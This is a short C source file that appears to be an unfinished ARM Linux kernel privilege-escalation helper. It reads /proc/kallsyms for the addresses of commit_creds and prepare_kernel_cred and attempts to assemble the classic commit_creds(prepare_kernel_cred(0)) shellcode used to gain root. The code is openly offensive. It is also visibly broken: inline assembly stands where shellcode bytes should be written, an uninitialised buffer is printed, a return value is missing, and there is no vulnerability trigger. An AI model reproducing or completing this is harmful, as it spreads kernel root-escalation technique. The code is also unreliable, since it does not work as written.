#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

/* For building the assembly code from the found kernel modules
 total assembly code:
  *  .code 32
  *  # enter thumb mode
  *  add r6,pc,#1
  *  bl r6
  *  .code 16
  *  sub r2,r2,r2
  *  mov r0,r2
  *  mov r2,addr1
  *  bl r2
  *  move r2,addr2
  *  bl r2
*/
size_t *build_assembly(size_t *addr1, size_t *addr2){
  char assembly_code[512];

  __asm__("add r6,pc,#1\n\t"
          "bl r6\n\t"
          "sub r2,r2,r2\n\t"
          "mov r0,r2\n\t"
          "ldr r2,=%0\n\t"
          "bl r2\n\t"
          "ldr r2,=%1\n\t"
          "bl r2\n\t"
          :
          :"r"(addr1), "r"(addr2)
          :"r6", "r0", "r2");

  printf("%s", assembly_code);


}

/* for finding the kernel module addresses */
size_t *find_symbol(char *name){
  FILE *fp;
  char *line;
  size_t len=0, *addr;

  if((fp = fopen("/proc/kallsyms", "r")) == NULL){
    return NULL;
  }

  while(getline(&line, &len, fp) > 0){
    if(strstr(line, name)){
      sscanf(line, "%p", &addr);
      return addr;
    }
  }
  
  return NULL;
}



int main(){
  size_t *commit_creds, *prepare_kernel_cred;

  commit_creds = find_symbol("commit_creds");
  printf("[+] commit_creds at %p\n", commit_creds);
  prepare_kernel_cred = find_symbol("prepare_kernel_cred");
  printf("[+] prepare_kernel_cred at %p\n", prepare_kernel_cred);

  build_assembly(prepare_kernel_cred, commit_creds);

  return 0;

}



